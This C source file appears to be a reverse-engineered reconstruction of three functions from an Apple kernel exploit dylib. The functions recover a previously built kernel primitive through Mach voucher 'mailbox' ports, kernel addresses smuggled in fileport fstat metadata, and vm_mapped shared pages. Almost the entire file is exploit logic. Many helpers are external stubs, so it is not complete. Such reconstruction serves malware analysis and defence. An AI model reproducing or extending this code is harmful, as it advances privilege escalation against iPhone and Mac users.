/*
 * record_0x90000_inherit.c
 * entry5_type0x09.dylib — state inheritance paths
 *
 * Three functions attempt to recover a previously-published kernel primitive
 * from shared memory / voucher mailbox / fileport-smuggled fstat metadata,
 * skipping the full exploit if a prior run already built the primitive.
 *
 * sub_1dd4c  — Path C (oldest):  fileport → fstat metadata smuggling
 * sub_1e090  — Path B (middle):  voucher mailbox → vm_map shared page
 * sub_1f1b8  — Path A (newest):  slot table → vm_map shared page
 *
 * Verified: key constants, port operations, fstat field reads, vm_map calls,
 *           state field writes, success/failure paths.
 * Inferred: "state inheritance" / "mailbox" labels from call context.
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/stat.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

/* private Mach trap */
extern mach_port_t mach_reply_port(void);

/* ── mailbox key base constants ──────────────────────────────────────────── */
#define MAILBOX_KEY_BASE_C   0x1122334455667788ULL  /* Path C / oldest       */
#define MAILBOX_KEY_BASE_B   0x3122334455667788ULL  /* Path B / middle       */

/* ── kaddr thresholds ────────────────────────────────────────────────────── */
#define KADDR_PATH_C_MAX     0x1C1B0A80100000ULL
#define KADDR_PATH_B_FLAGS   0x5584001
#define KADDR_PATH_B_ALT     0x1F530000000000ULL
#define KADDR_PATH_A_MIN     0x1F543C40800000ULL

/* ── state field offsets (byte) ──────────────────────────────────────────── */
#define OFF_KADDR       (0x56 * 4)
#define OFF_FLAGS       0
#define OFF_XNU_MAJOR   (0x140 * 4)   /* int */
#define OFF_FD0         (0x64c * 4)
#define OFF_FD1         (0x64d * 4)
#define OFF_FD2         (0x64e * 4)
#define OFF_FD3         (0x64f * 4)
#define OFF_FD4         (0x650 * 4)
#define OFF_KOBJ        (0x674 * 4)   /* __darwin_time_t / long */
#define OFF_KBASE       (0x678 * 4)   /* long */
#define OFF_KOBJ2       (0x86 * 4)    /* ulong */
#define OFF_KOBJ3       (0x88 * 4)    /* undefined8 */
#define OFF_MASK        (0x62 * 4)    /* ulong */
#define OFF_SCALE       (0x60 * 4)    /* uint */
/* Path B shared page fields */
#define OFF_B_KOBJ      0x19d0        /* uint64 kernel object addr            */
#define OFF_B_KREGION   (0xf0 * 4)    /* uint64 kernel region                 */
#define OFF_B_CONN      (0xe8 * 4)    /* mem_entry_name_port_t                */
#define OFF_B_MAPPED    (0xf8 * 4)    /* vm_address_t mapped window           */
#define OFF_B_SIZE      (0x100 * 4)   /* ulong mapped size                    */
#define OFF_B_ENTRY     (0x114 * 4)   /* mem_entry_name_port_t                */
#define OFF_B_IDX       (0x108 * 4)   /* ulong index                          */
#define OFF_B_VAL       (0x110 * 4)   /* uint32 value                         */
/* Path A shared page fields */
#define OFF_A_KOBJ      0x19d0
#define OFF_A_KOBJ2     (0x898 * 4)   /* uint64 */
#define OFF_A_IDX       (0x8a0 * 4)   /* int */
#define OFF_A_PORT      (0x58 * 4)    /* mach_port_name_t */
#define OFF_A_PTR0      (0x80 * 4)    /* ulong */
#define OFF_A_IDX0      (0x88 * 4)    /* int */
#define OFF_A_PTR1      (0xa0 * 4)    /* ulong */
#define OFF_A_IDX1      (0xa8 * 4)    /* int */

/* ── forward declarations ────────────────────────────────────────────────── */
extern int  sub_26180(int *out_lock);           /* acquire mailbox lock       */
extern int  sub_26120(int lock);                /* release mailbox lock       */
extern int  sub_3746c(uint32_t *state, uint64_t key, mach_port_name_t *out);
extern int  sub_4180c(mach_port_name_t port);   /* fileport_makefd            */
extern int  sub_21568(uint32_t *fds);           /* fd-pair setup              */
extern int  sub_1ad70(uint32_t *state, uint64_t addr); /* kaddr validate      */
extern int  sub_1dcbc(uint32_t *state);
extern int  sub_214a8(uint32_t *fds);           /* fd-pair validate           */
extern long sub_1d7c4(uint64_t ctx, long idx);  /* slot table lookup          */
extern int  sub_289c8(uint32_t *state, int mode);
extern int  sub_29b88(uint32_t *state, int mode);
extern int  sub_2b114(uint32_t *state, uint64_t val);

/* ── sub_1dd4c — Path C: fileport / fstat metadata smuggling ────────────── */
/*
 * Resolves 3–4 keyed handles from MAILBOX_KEY_BASE_C.
 * Converts voucher ports to fds via fileport_makefd().
 * Kernel addresses are smuggled through fstat metadata:
 *   st_atimespec.tv_sec  → kernel object address → state+OFF_KOBJ
 *   st_atimespec.tv_nsec → kernel base/slide     → state+OFF_KBASE
 *
 * Sets *out = 1 on success, 0 on failure.
 */
void sub_1dd4c(uint32_t *state, uint32_t *out)
{
    mach_port_t task = mach_task_self();
    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);

    /* number of handles to resolve: 3 for mid-range, 4 for oldest */
    long count = 3;
    if (kaddr < KADDR_PATH_C_MAX ||
        (!(*(uint32_t *)state & KADDR_PATH_B_FLAGS) &&
         kaddr < KADDR_PATH_B_ALT))
        count = 4;

    int lock = -1;
    if (sub_26180(&lock) != 0) goto fail;

    mach_port_name_t ports[4] = {0};
    uint32_t fds[4] = {0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff};

    for (long i = 0; i < count; i++) {
        int rc = sub_3746c(state, MAILBOX_KEY_BASE_C + i, &ports[i]);
        if (rc != 1) goto cleanup;
        int fd = sub_4180c(ports[i]);
        fds[i] = (uint32_t)fd;
        mach_port_deallocate(task, ports[i]);
        ports[i] = MACH_PORT_NULL;
        if (fd < 0) goto cleanup;
    }

    if (sub_21568(fds) != 0) goto cleanup;

    /* store fd slots */
    *(uint32_t *)((uint8_t *)state + OFF_FD0) = fds[0];
    *(uint32_t *)((uint8_t *)state + OFF_FD1) = fds[1];
    if (count == 4)
        *(uint64_t *)((uint8_t *)state + OFF_FD2) = *(uint64_t *)&fds[2];
    else
        *(uint32_t *)((uint8_t *)state + OFF_FD4) = fds[2];

    /* read kernel addresses from fstat metadata */
    struct stat st;
    if (fstat((int)fds[1], &st) == 0) {
        /* tv_sec → kernel object address */
        long kobj = st.st_atimespec.tv_sec;
        if (sub_1ad70(state, (uint64_t)kobj))
            *(long *)((uint8_t *)state + OFF_KOBJ) = kobj;

        if (count == 4) {
            /* tv_nsec → kernel base (oldest path) */
            long nsec = st.st_atimespec.tv_nsec;
            if (nsec && (*(uint64_t *)((uint8_t *)state + OFF_MASK) & nsec) == 0)
                *(long *)((uint8_t *)state + OFF_KBASE) = nsec;
        } else {
            /* tv_nsec encodes kernel base via bit manipulation */
            uint64_t nsec = (uint64_t)st.st_atimespec.tv_nsec;
            uint64_t kbase = nsec | 0xffffff0000000000ULL;
            if (sub_1ad70(state, kbase))
                *(uint64_t *)((uint8_t *)state + OFF_KOBJ2) = kbase;

            uint64_t scaled = (nsec >> 0x28) *
                              *(uint32_t *)((uint8_t *)state + OFF_SCALE);
            if (scaled && (*(uint64_t *)((uint8_t *)state + OFF_MASK) & scaled) == 0)
                *(uint64_t *)((uint8_t *)state + OFF_KBASE) = scaled;

            /* optional: resolve additional pointer from ctx */
            if (*(uint32_t *)((uint8_t *)state + OFF_FD0) != 0xffffffff &&
                *(uint32_t *)((uint8_t *)state + OFF_FD1) != 0xffffffff &&
                *(uint32_t *)((uint8_t *)state + OFF_FD4) != 0xffffffff &&
                *(uint64_t *)((uint8_t *)state + OFF_KOBJ2) != 0 &&
                kaddr > 0x1C1B19145FFFFFULL &&
                sub_1dcbc(state) == 0) {
                long ctx_base = *(long *)((uint8_t *)state + 0x118 * 4);
                if (ctx_base) {
                    uint64_t extra = *(uint64_t *)(ctx_base + 0x100);
                    if (sub_1ad70(state, extra))
                        *(uint64_t *)((uint8_t *)state + OFF_KOBJ3) = extra;
                }
            }
        }
    }

    sub_214a8((uint32_t *)((uint8_t *)state + OFF_FD0));
    sub_26120(lock);
    *out = 1;
    return;

cleanup:
    sub_26120(lock);
fail:
    for (int i = 0; i < 4; i++)
        if (fds[i] != 0xffffffff) close((int)fds[i]);
    *out = 0;
}

/* ── sub_1e090 — Path B: voucher mailbox → vm_map shared page ───────────── */
/*
 * Resolves 3 ports from MAILBOX_KEY_BASE_B + offset.
 * On older builds (xnu < 0x2258): validates via IOConnectCallMethod sel 999.
 * Maps connection[0] and object into memory.
 * Reads pre-computed kernel state from the mapped page:
 *   +0x00: kernel object address → state+OFF_B_KOBJ
 *   +0x08: kernel region         → state+OFF_B_KREGION
 *   +0x10: index (uint32)        → state+OFF_B_IDX
 *   +0x14: value (uint32)        → state+OFF_B_VAL
 *
 * Sets *out = 1 on success, 0 on failure.
 */
void sub_1e090(long state, uint32_t *out)
{
    mach_port_t task = mach_task_self();
    vm_size_t page_size = vm_page_size;
    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);

    int lock = -1;
    if (sub_26180(&lock) != 0) goto fail_nolock;

    mach_port_name_t ports[3] = {0};
    vm_address_t mapped = 0;
    vm_address_t mapped2 = 0;

    for (int i = 0; i < 3; i++) {
        if (kaddr < KADDR_PATH_A_MIN) {
            int rc = sub_3746c((uint32_t *)state,
                               MAILBOX_KEY_BASE_B + i, &ports[i]);
            if (rc == 0) goto cleanup;
            if (!MACH_PORT_VALID(ports[i])) goto cleanup;
        } else {
            /* newer builds: slot table lookup */
            mach_port_name_t *slot = (mach_port_name_t *)sub_1d7c4(0, i);
            if (!slot) goto cleanup;
            ports[i] = *slot;
            if (!MACH_PORT_VALID(ports[i])) goto cleanup;
            mach_port_mod_refs(task, ports[i], MACH_PORT_RIGHT_SEND, 1);
        }
    }

    /* older builds: validate via IOConnectCallMethod selector 999 */
    if (*(int *)((uint8_t *)state + OFF_XNU_MAJOR) < 0x2258) {
        extern kern_return_t IOConnectCallMethod(
            mach_port_t, uint32_t, const uint64_t *, uint32_t,
            const void *, size_t, uint64_t *, uint32_t *,
            void *, size_t *);
        kern_return_t kr = IOConnectCallMethod(
            ports[1], 999, NULL, 0, NULL, 0, NULL, NULL, NULL, NULL);
        if (kr != (kern_return_t)-0x1ffffd39) goto cleanup;
    }

    /* map connection[0] and object */
    kern_return_t kr = vm_map(task, &mapped, page_size, 0, 1,
                              ports[0], 0, 0,
                              VM_PROT_READ|VM_PROT_WRITE, VM_PROT_ALL,
                              VM_INHERIT_DEFAULT);
    if (kr) goto cleanup;

    kr = vm_map(task, &mapped2, page_size, 0, 1,
                ports[2], 0, 0,
                VM_PROT_READ|VM_PROT_WRITE, VM_PROT_ALL,
                VM_INHERIT_DEFAULT);
    if (kr) goto cleanup;

    /* read pre-computed kernel state from mapped page */
    uint64_t kobj   = *(uint64_t *)(mapped2 + 0x00);
    uint64_t kreg   = *(uint64_t *)(mapped2 + 0x08);
    uint32_t idx    = *(uint32_t *)(mapped2 + 0x10);
    uint32_t val    = *(uint32_t *)(mapped2 + 0x14);

    if (!sub_1ad70((uint32_t *)state, kobj)) goto cleanup;
    if (!sub_1ad70((uint32_t *)state, kreg)) goto cleanup;

    *(uint64_t *)((uint8_t *)state + OFF_B_KOBJ)   = kobj;
    *(uint64_t *)((uint8_t *)state + OFF_B_KREGION) = kreg;
    *(mach_port_name_t *)((uint8_t *)state + OFF_B_CONN)   = ports[1];
    *(vm_address_t *)((uint8_t *)state + OFF_B_MAPPED)     = mapped;
    *(uint64_t *)((uint8_t *)state + OFF_B_SIZE)           = page_size;
    *(mach_port_name_t *)((uint8_t *)state + OFF_B_ENTRY)  = ports[0];
    *(uint32_t *)((uint8_t *)state + OFF_B_VAL)            = val;
    *(uint64_t *)((uint8_t *)state + OFF_B_IDX)            = idx;

    sub_26120(lock);
    if (mapped2) vm_deallocate(task, mapped2, page_size);
    *out = 1;
    return;

cleanup:
    sub_26120(lock);
    if (mapped)  vm_deallocate(task, mapped,  page_size);
    if (mapped2) vm_deallocate(task, mapped2, page_size);
    for (int i = 0; i < 3; i++)
        if (MACH_PORT_VALID(ports[i]))
            mach_port_deallocate(task, ports[i]);
fail_nolock:
    *out = 0;
}

/* ── sub_1f1b8 — Path A: slot table → vm_map shared page (newest) ────────── */
/*
 * Only runs when kaddr > KADDR_PATH_A_MIN.
 * Resolves 2 ports from slot table via sub_1d7c4(ctx, 0) and (ctx, 1).
 * Maps the shared page and reads 7 fields:
 *   [0]:   kernel object address
 *   [4]:   secondary kernel object
 *   [5]:   index (< 0x20)
 *   [6,7]: pointer/index pair A
 *   [8,9]: pointer/index pair B
 *
 * Sets *out = 1 on success, 0 on failure.
 */
void sub_1f1b8(long state, uint32_t *out)
{
    mach_port_t task = mach_task_self();
    vm_size_t page_size = vm_page_size;
    uint64_t kaddr = *(uint64_t *)((uint8_t *)state + OFF_KADDR);

    *out = 0;
    if (kaddr <= KADDR_PATH_A_MIN) return;

    int lock = -1;
    uint64_t ctx = 0;
    if (sub_26180(&lock) != 0) return;

    mach_port_name_t ports[2] = {0};
    vm_address_t mapped = 0;

    for (int i = 0; i < 2; i++) {
        mach_port_name_t *slot = (mach_port_name_t *)sub_1d7c4(ctx, i);
        if (!slot) goto cleanup;
        ports[i] = *slot;
        if (!MACH_PORT_VALID(ports[i])) goto cleanup;
        mach_port_mod_refs(task, ports[i], MACH_PORT_RIGHT_SEND, 1);
    }

    kern_return_t kr = vm_map(task, &mapped, page_size, 0, 1,
                              ports[1], 0, 0,
                              VM_PROT_READ|VM_PROT_WRITE, VM_PROT_ALL,
                              VM_INHERIT_DEFAULT);
    if (kr) goto cleanup;

    uint64_t *page = (uint64_t *)mapped;

    /* validate and store kernel object addresses */
    if (!sub_1ad70((uint32_t *)state, page[0])) goto cleanup;
    *(uint64_t *)((uint8_t *)state + OFF_A_KOBJ) = page[0];

    if (!sub_1ad70((uint32_t *)state, page[4])) goto cleanup;
    *(uint64_t *)((uint8_t *)state + OFF_A_KOBJ2) = page[4];

    uint64_t idx = page[5];
    if (idx >= 0x20) goto cleanup;
    *(int *)((uint8_t *)state + OFF_A_IDX) = (int)idx;
    *(mach_port_name_t *)((uint8_t *)state + OFF_A_PORT) = ports[0];

    /* pointer/index pairs */
    uint64_t ptr0 = page[6];
    int      idx0 = (int)page[7];
    uint64_t ptr1 = page[8];
    int      idx1 = (int)page[9];

    if (!ptr0 || (ptr0 & 7) || !idx0) goto cleanup;
    if (!ptr1 || (ptr1 & 7) || !idx1) goto cleanup;

    *(uint64_t *)((uint8_t *)state + OFF_A_PTR0) = ptr0;
    *(int *)((uint8_t *)state + OFF_A_IDX0)      = idx0;
    *(uint64_t *)((uint8_t *)state + OFF_A_PTR1) = ptr1;
    *(int *)((uint8_t *)state + OFF_A_IDX1)      = idx1;

    int rc = sub_289c8((uint32_t *)state, 1);
    if (rc == 0) {
        sub_26120(lock);
        lock = -1;
        rc = sub_29b88((uint32_t *)state, 0);
    }

    if (rc == 0) {
        vm_deallocate(task, mapped, page_size);
        *out = 1;
        return;
    }

cleanup:
    if (lock != -1) sub_26120(lock);
    for (int i = 0; i < 2; i++)
        if (MACH_PORT_VALID(ports[i]))
            mach_port_deallocate(task, ports[i]);
    if (mapped) vm_deallocate(task, mapped, page_size);
    *out = 0;
}
